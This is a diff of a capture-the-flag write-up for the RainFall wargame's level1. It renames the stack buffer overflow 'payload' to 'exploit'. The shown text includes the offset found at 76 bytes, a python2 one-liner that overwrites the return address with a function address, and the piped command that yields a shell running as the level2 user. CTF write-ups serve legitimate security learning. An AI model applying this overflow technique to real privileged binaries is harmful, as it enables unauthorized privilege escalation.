@@ -90,15 +90,15 @@ Finding cyclic pattern of 4 bytes: b'taaa' (hex: 0x74616161)
 Found at offset 76
 ```
 
-## Crafting the Payload
+## Crafting the Exploit
 
-We use Python to create a payload consisting of 76 'A's followed by the address of the `run` function in little-endian
+We use Python to create an exploit consisting of 76 'A's followed by the address of the `run` function in little-endian
 format, with the intention of overwriting the EIP register and redirecting the program flow to the `run` function.
-We save the result to the file `/tmp/payload`.
+We save the result to the file `/tmp/exploit1`.
 
 ```shell
 ┌──(kali㉿kali)-[~/rainfall/level1]
-└─$ python2 -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/payload 
+└─$ python2 -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit1 
 ```
 
 ## Executing `run` function
@@ -108,7 +108,7 @@ interactive terminal to work properly. Once we run our exploit successfully, we 
 the shell is running as the `level2` user. 
 
 ```shell
-level1@RainFall:~$ cat /tmp/payload - | ./level1
+level1@RainFall:~$ cat /tmp/exploit1 - | ./level1
 Good... Wait what?
 id
 uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
